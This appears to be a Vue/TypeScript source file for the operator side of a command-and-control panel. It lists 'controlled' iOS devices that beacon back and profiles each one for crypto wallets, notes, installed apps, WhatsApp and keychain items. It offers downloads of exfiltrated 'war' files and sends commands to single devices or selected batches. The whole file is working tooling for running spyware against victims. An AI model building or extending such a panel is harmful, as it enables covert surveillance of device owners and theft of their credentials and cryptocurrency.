<script setup lang="ts">
import { computed, onMounted, ref, watch } from 'vue'
import { useRoute } from 'vue-router'
import { panelApi } from '@/api/panel'
import { useDashStore } from '@/stores/dash'
import { useCommandStore } from '@/stores/command'
import type { ManagedDevice } from '@/api/types'
import CommandDialog from '@/components/CommandDialog.vue'
import EmptyState from '@/components/EmptyState.vue'
import { shortIP, tsShort, fmtBytes } from '@/utils/format'
import { downloadUrl } from '@/api/http'
import { Download } from '@element-plus/icons-vue'
import { ElMessage } from 'element-plus'

/**
 * 我的设备：/a + /beacon 收包解析出的受控设备（每台 = 一个 uuid 一行）。
 * 不含交付进度（那是"访问统计"模块的维度）；只展示受控设备的资产画像。
 * 排版：设备身份集中到主列（三层），资产 chip 分组，避免列过多挤压。
 */
const dash = useDashStore()
const cmd = useCommandStore()
const route = useRoute()

const devices = ref<ManagedDevice[]>([])
const loading = ref(false)
const kw = ref('')
const selected = ref<ManagedDevice[]>([])
/** 钱包设备筛选：全部 / 仅有钱包 / 仅无钱包 */
const walletFilter = ref<'all' | 'wallet' | 'none'>('all')

// ── 服务端分页状态 ──
const page = ref(1)
const per = ref(20)
const total = ref(0) // 当前筛选条件下的设备总数
const walletCount = ref(0) // 全量钱包设备数（服务端口径，与筛选无关）
const tableRef = ref()

/** 请求序号：丢弃过期响应，避免快速切页/筛选时旧响应覆盖新数据 */
let reqSeq = 0

async function load() {
  const seq = ++reqSeq
  loading.value = true
  try {
    const r = await panelApi.devices(kw.value.trim(), walletFilter.value, page.value, per.value)
    if (seq !== reqSeq) return // 已有更新的请求在途
    devices.value = r?.devices ?? []
    total.value = Number(r?.total ?? devices.value.length)
    walletCount.value = Number(r?.wallet_count ?? 0)
    // 筛选/每页变化后当前页可能越界：回落到最后一页并重拉
    const maxPage = Math.max(1, Math.ceil(total.value / per.value))
    if (page.value > maxPage) {
      page.value = maxPage
      void load()
      return
    }
  } catch {
    if (seq === reqSeq) {
      devices.value = []
      total.value = 0
    }
  } finally {
    if (seq === reqSeq) loading.value = false
  }
}

/** 筛选条件变化：清空勾选（避免误向被筛掉的设备下发）并回到第 1 页 */
function resetAndLoad() {
  tableRef.value?.clearSelection?.()
  page.value = 1
  void load()
}

function onPageChange(p: number) {
  page.value = p
  void load()
}

function onSizeChange(s: number) {
  per.value = s
  page.value = 1
  void load()
}

// kw 防抖：避免逐字符触发请求风暴
let kwTimer: ReturnType<typeof setTimeout> | null = null
watch(kw, () => {
  if (kwTimer) clearTimeout(kwTimer)
  kwTimer = setTimeout(resetAndLoad, 300)
})
watch(walletFilter, resetAndLoad)

onMounted(() => {
  // 支持从其它模块带 ?kw= 跳入（如应用资产点击设备 UUID）
  const q = String(route.query.kw ?? '')
  if (q) kw.value = q // 交给 kw watcher（防抖后加载）
  else void load()
  void cmd.refreshTargets()
})

/** 排序状态（点表头切换；默认在线优先 + 组内最近活跃在前） */
const sortState = ref<{ prop: string; order: 'ascending' | 'descending' | null }>({
  prop: 'online',
  order: 'descending',
})

function onSortChange(s: { prop?: string | null; order?: 'ascending' | 'descending' | null }) {
  sortState.value = { prop: s.prop || '', order: s.order ?? null }
}

/** 排序取值：数字列数值比较，时间/IP 字符串比较，钱包/队列取权重 */
function sortVal(row: ManagedDevice, prop: string): string | number {
  switch (prop) {
    case 'online':
      return row.online ? 1 : 0
    case 'ws':
      return row.ws ? 1 : 0
    case 'wallets':
      return (row.wallets ?? []).length
    case 'queue': {
      const q = queueOf(row)
      return (q?.armed ?? 0) * 10000 + (q?.dispatched ?? 0)
    }
    case 'notes_count':
      return Number(row.notes_count ?? 0)
    case 'apps_count':
      return Number(row.apps_count ?? 0)
    case 'first_seen':
    case 'last_seen':
      return String(row[prop] ?? '')
    default:
      return String((row as Record<string, unknown>)[prop] ?? '')
  }
}

// 数据源已由服务端分页+筛选；此处只对“当前页”做本地排序。
// 注意：排序作用于当前页的行，跨页全局排序由服务端默认顺序（first_seen desc）承担。
const rows = computed(() => {
  const out = [...devices.value]
  out.sort((a, b) => {
    const { prop, order } = sortState.value
    if (prop && order) {
      const dir = order === 'ascending' ? 1 : -1
      const va = sortVal(a, prop)
      const vb = sortVal(b, prop)
      if (va !== vb) return va < vb ? -dir : dir
      // 同值兜底：最近活跃在前
      return String(b.last_seen ?? '').localeCompare(String(a.last_seen ?? ''))
    }
    // 无排序态：uuid 兜底（保证稳定）
    return String(a.uuid ?? '').localeCompare(String(b.uuid ?? ''))
  })
  return out
})

const queueMap = computed(() => {
  const m = new Map<string, { armed: number; dispatched: number }>()
  for (const t of cmd.targets) {
    m.set(String(t.target ?? ''), {
      armed: Number(t.armed ?? 0),
      dispatched: Number(t.dispatched ?? 0),
    })
  }
  return m
})

function queueOf(d: ManagedDevice) {
  return queueMap.value.get(String(d.ip ?? '')) ?? queueMap.value.get(String(d.uuid ?? ''))
}

// ── 指令弹窗 ──
const dialog = ref(false)
const dialogTargets = ref<string[]>([])

function armOne(row: ManagedDevice) {
  if (!row.ip) {
    ElMessage.warning('该设备无 IP，无法作为下发目标')
    return
  }
  dialogTargets.value = [row.ip]
  dialog.value = true
}

function armSelected() {
  const ips = selected.value.map((d) => d.ip).filter((x): x is string => !!x)
  if (!ips.length) {
    ElMessage.warning('请先勾选设备')
    return
  }
  dialogTargets.value = ips
  dialog.value = true
}

// ── 详情抽屉：直显 row 资产详情（零请求、秒开）──
const drawer = ref(false)
const current = ref<ManagedDevice | null>(null)

function openDevice(row: ManagedDevice) {
  current.value = row
  drawer.value = true
}

// 自动刷新：抽屉打开时不重载（避免正在看详情时列表在背后重排）。
watch(
  () => dash.snap.ts,
  () => {
    if (dash.snap.ts && !drawer.value) void load()
  },
)

// ── UUID 折叠：显示前 5 后 4，tooltip 全文，点击复制 ──
function shortUuid(u?: string) {
  if (!u) return ''
  return u.length <= 10 ? u : `${u.slice(0, 5)}…${u.slice(-4)}`
}
async function copyUuid(u?: string) {
  if (!u) return
  try {
    await navigator.clipboard.writeText(u)
    ElMessage.success('UUID 已复制')
  } catch {
    ElMessage.warning('复制失败，请手动复制')
  }
}
</script>

<template>
  <section class="app-card">
    <div class="app-card__head">
      <h3 class="app-card__title">
        <el-icon><Monitor /></el-icon>我的设备
        <span class="chip">本页 {{ devices.length }} / 共 {{ total }}</span>
        <span v-if="walletCount" class="chip chip--violet">钱包设备 {{ walletCount }}</span>
        <span v-if="selected.length" class="chip chip--brand">已选 {{ selected.length }}</span>
      </h3>
      <div class="row row--wrap">
        <el-button v-if="selected.length" type="primary" size="small" @click="armSelected">
          <el-icon><Promotion /></el-icon>
          <span style="margin-left: 4px">批量下发（{{ selected.length }}）</span>
        </el-button>
        <el-select v-model="walletFilter" size="small" style="width: 132px">
          <el-option label="全部设备" value="all" />
          <el-option label="仅钱包设备" value="wallet" />
          <el-option label="仅无钱包" value="none" />
        </el-select>
        <el-input v-model="kw" size="small" placeholder="筛选 uuid / IP / 设备名 / 机型 / iOS" clearable
          style="width: 260px" />
        <el-button size="small" :loading="loading" @click="load">刷新</el-button>
      </div>
    </div>

    <div class="app-card__body app-card__body--flush">
      <el-table
        ref="tableRef"
        :data="rows"
        size="small"
        row-key="uuid"
        height="calc(100vh - 236px)"
        empty-text="…"
        :default-sort="{ prop: 'online', order: 'descending' }"
        @sort-change="onSortChange"
        @selection-change="(v: ManagedDevice[]) => (selected = v)"
      >
        <el-table-column type="selection" width="42" :reserve-selection="true" />

        <el-table-column label="UUID" prop="uuid" sortable="custom" width="110">
          <template #default="{ row }">
            <el-tooltip v-if="row.uuid" placement="top" :content="row.uuid">
              <span class="mono uuid-link" title="点击复制完整 UUID" @click="copyUuid(row.uuid)">
                {{ shortUuid(row.uuid) }}
              </span>
            </el-tooltip>
            <span v-else class="t-3" style="font-size: var(--fs-xs)">—</span>
          </template>
        </el-table-column>

        <el-table-column label="设备名 / 在线" prop="online" sortable="custom" min-width="180" show-overflow-tooltip>
          <template #default="{ row }">
            <div class="dev-name-cell">
              <span class="dot" :class="row.online ? 'dot--ok' : 'dot--off'" />
              <span
                class="dev-name"
                :title="row.deviceName || row.machine ? '' : '该设备未上报档案（需 /a 或 beacon.device_info 才有名称/机型/iOS）'"
              >{{ row.deviceName || row.machine || row.ip || '未知设备' }}</span>
            </div>
          </template>
        </el-table-column>

        <el-table-column label="iOS 版本" prop="ios" sortable="custom" width="100">
          <template #default="{ row }">
            <span v-if="row.ios" class="chip chip--brand">iOS {{ row.ios }}</span>
            <span v-else class="t-3" style="font-size: var(--fs-xs)">—</span>
          </template>
        </el-table-column>

        <el-table-column label="钱包" prop="wallets" sortable="custom" width="80" align="center">
          <template #default="{ row }">
            <template v-if="(row.wallets ?? []).length">
              <el-tooltip placement="top">
                <template #content>
                  <div class="wallet-tip">
                    <div v-for="w in row.wallets" :key="w.rule" class="wallet-tip__row">
                      <span>{{ w.display || w.rule }}</span>
                      <b v-if="w.count"> ×{{ w.count }}</b>
                    </div>
                  </div>
                </template>
                <span class="wallet-yes">有钱包 · {{ row.wallets.length }}</span>
              </el-tooltip>
            </template>
            <span v-else class="t-3" style="font-size: var(--fs-xs)">—</span>
          </template>
        </el-table-column>

        <el-table-column label="备忘录" prop="notes_count" sortable="custom" width="70" align="center">
          <template #default="{ row }"><b class="n">{{ row.notes_count ?? 0 }}</b></template>
        </el-table-column>

        <el-table-column label="应用" prop="apps_count" sortable="custom" width="60" align="center">
          <template #default="{ row }"><b class="n">{{ row.apps_count ?? 0 }}</b></template>
        </el-table-column>

        <el-table-column label="WS" prop="ws" sortable="custom" width="64" align="center">
          <template #default="{ row }">
            <el-tooltip placement="top" content="WhatsApp：按已安装应用包名（whatsapp）映射">
              <span v-if="row.ws" class="chip chip--ok">有</span>
              <span v-else class="chip">无</span>
            </el-tooltip>
          </template>
        </el-table-column>

        <el-table-column label="IP" prop="ip" sortable="custom" width="130">
          <template #default="{ row }"><span class="mono ellipsis" :title="row.ip">{{ shortIP(row.ip) }}</span></template>
        </el-table-column>

        <el-table-column label="指令队列" prop="queue" sortable="custom" width="90">
          <template #default="{ row }">
            <span v-if="queueOf(row)?.armed" class="chip chip--warn">待发 {{ queueOf(row)?.armed }}</span>
            <span v-else-if="queueOf(row)?.dispatched" class="chip chip--ok">已发 {{ queueOf(row)?.dispatched }}</span>
            <span v-else class="t-3" style="font-size: var(--fs-xs)">—</span>
          </template>
        </el-table-column>

        <el-table-column label="首次上线" prop="first_seen" sortable="custom" width="110">
          <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.first_seen) }}</span></template>
        </el-table-column>

        <el-table-column label="最后上线" prop="last_seen" sortable="custom" width="110">
          <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.last_seen) }}</span></template>
        </el-table-column>

        <el-table-column label="操作" width="110" fixed="right">
          <template #default="{ row }">
            <el-button link size="small" type="primary" @click="armOne(row)">指令</el-button>
            <el-button link size="small" @click="openDevice(row)">详情</el-button>
          </template>
        </el-table-column>

        <template #empty><EmptyState text="暂无受控设备（/a /beacon 尚未回传）" /></template>
      </el-table>

      <div class="pager">
        <el-pagination
          :current-page="page"
          :page-size="per"
          :page-sizes="[20, 50, 100, 200]"
          :total="total"
          background
          small
          layout="total, sizes, prev, pager, next, jumper"
          @current-change="onPageChange"
          @size-change="onSizeChange"
        />
      </div>
    </div>

    <CommandDialog v-model="dialog" :targets="dialogTargets" @done="cmd.refreshTargets()" />

    <el-drawer v-model="drawer" :title="`设备详情 · ${current?.deviceName || current?.machine || current?.uuid || ''}`"
      size="46%">
      <div class="tl">
        <!-- 基本信息 + 资产：直接来自表格 row，打开即显 -->
        <dl class="detail-grid">
          <div class="detail-item">
            <dt>UUID</dt>
            <dd>
              <template v-if="current?.uuid">
                <span class="mono t-2">{{ current.uuid }}</span>
                <el-button link size="small" type="primary" @click="copyUuid(current.uuid)">复制</el-button>
              </template>
              <span v-else class="t-3">-</span>
            </dd>
          </div>
          <div class="detail-item"><dt>设备名</dt><dd>{{ current?.deviceName || current?.machine || '-' }}</dd></div>
          <div class="detail-item"><dt>机型</dt><dd>{{ current?.machine || '-' }}</dd></div>
          <div class="detail-item"><dt>iOS</dt>
            <dd><span v-if="current?.ios" class="mono">iOS {{ current.ios }}</span><span v-else class="t-3">-</span></dd>
          </div>
          <div class="detail-item"><dt>IP</dt><dd><span class="mono">{{ current?.ip || '-' }}</span></dd></div>
          <div class="detail-item"><dt>状态</dt>
            <dd><span class="chip" :class="current?.online ? 'chip--ok' : 'chip--muted'">{{ current?.online ? '在线'
                : '离线' }}</span></dd>
          </div>
          <div class="detail-item"><dt>首次上线</dt><dd><span class="mono t-2">{{ tsShort(current?.first_seen) }}</span></dd>
          </div>
          <div class="detail-item"><dt>最后上线</dt><dd><span class="mono t-2">{{ tsShort(current?.last_seen) }}</span></dd>
          </div>
          <div class="detail-item"><dt>钱包</dt>
            <dd>
              <div class="asset-chips">
                <template v-if="(current?.wallets ?? []).length">
                  <span v-for="w in current!.wallets" :key="w.rule" class="chip chip--violet">
                    {{ w.display || w.rule }}<template v-if="w.count"> ×{{ w.count }}</template>
                  </span>
                </template>
                <span v-else class="t-3">无</span>
              </div>
            </dd>
          </div>
          <div class="detail-item"><dt>资产统计</dt>
            <dd>
              备忘录 <b class="n">{{ current?.notes_count ?? 0 }}</b> ·
              应用 <b class="n">{{ current?.apps_count ?? 0 }}</b> ·
              钥匙串 <b class="n">{{ current?.war_count ?? 0 }}</b>
            </dd>
          </div>
          <div class="detail-item detail-item--full">
            <dt>war 回传文件（{{ current?.war_count ?? (current?.war_files ?? []).length }}）</dt>
            <dd>
              <div v-if="(current?.war_files ?? []).length" class="war-files">
                <a
                  v-for="w in current!.war_files"
                  :key="String(w.packet_id ?? w.file)"
                  class="war-file"
                  :href="w.file ? downloadUrl('war', w.file) : `/panel/download?packet_id=${w.packet_id}`"
                  :title="`下载 war 原包 ${w.file || ('packet#' + w.packet_id)}`"
                  download
                >
                  <el-icon><Download /></el-icon>
                  <span class="mono war-file__name">{{ w.file || ('packet#' + w.packet_id) }}</span>
                  <span class="war-file__meta">{{ tsShort(w.ts) }} · {{ fmtBytes(w.size) }}</span>
                </a>
              </div>
              <span v-else class="t-3">无</span>
            </dd>
          </div>
          <div v-if="queueOf(current ?? ({} as ManagedDevice))" class="detail-item"><dt>指令队列</dt>
            <dd>
              <span v-if="queueOf(current!)?.armed" class="chip chip--warn">待发 {{ queueOf(current!)?.armed }}</span>
              <span v-else class="chip chip--ok">已发 {{ queueOf(current!)?.dispatched }}</span>
            </dd>
          </div>
          <div class="detail-item"><dt>操作</dt>
            <dd>
              <el-button size="small" type="primary" plain @click="armOne(current!)">下发指令</el-button>
            </dd>
          </div>
        </dl>
      </div>
    </el-drawer>
  </section>
</template>

<style scoped>
.dev-name-cell {
  display: flex;
  align-items: center;
  gap: 6px;
  min-width: 0;
}
.dev-name {
  font-weight: 600;
  font-size: var(--fs-md);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

/* 在线状态点 */
.dot {
  flex: none;
  width: 8px;
  height: 8px;
  border-radius: 50%;
}
.dot--ok {
  background: var(--c-ok);
  box-shadow: 0 0 6px rgba(52, 211, 153, .6);
}
.dot--off {
  background: var(--text-3);
  opacity: .55;
}

/* UUID 短显示 */
.uuid-link {
  cursor: pointer;
  color: var(--text-2);
  transition: color .15s;
  word-break: break-all;
}
.uuid-link:hover {
  color: var(--brand-2);
  text-decoration: underline;
}

/* 钱包有/无 */
.wallet-yes {
  display: inline-flex;
  padding: 1px 8px;
  border-radius: var(--r-pill);
  font-size: var(--fs-xs);
  background: rgba(167, 139, 250, .13);
  border: 1px solid rgba(167, 139, 250, .32);
  color: #a78bfa;
  cursor: default;
  white-space: nowrap;
}
.asset-chips {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
}
.n {
  color: var(--text-1);
  font-weight: 600;
}

/* 分页器：右对齐，贴表格底部 */
.pager {
  display: flex;
  justify-content: flex-end;
  padding: 8px 12px 2px;
}

/* 设备详情：war 回传下载列表 */
.detail-item--full {
  grid-column: 1 / -1;
}
.war-files {
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.war-file {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 4px 8px;
  border-radius: 6px;
  border: 1px solid var(--border);
  background: var(--bg-hover);
  color: var(--text-1);
  text-decoration: none;
  font-size: var(--fs-xs);
}
.war-file:hover {
  border-color: var(--brand);
  color: var(--brand-2);
}
.war-file__name {
  flex: 1;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.war-file__meta {
  flex: none;
  color: var(--text-3);
}

/* 抽屉详情网格 */
.tl {
  display: flex;
  flex-direction: column;
  height: 100%;
  padding: var(--sp-4) var(--sp-5);
}
.detail-grid {
  margin: 0 0 var(--sp-4);
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px 18px;
}
.detail-item dt {
  font-size: var(--fs-xs);
  color: var(--text-3);
  margin-bottom: 2px;
}
.detail-item dd {
  margin: 0;
  font-size: var(--fs-sm);
  color: var(--text-1);
  word-break: break-all;
}
</style>
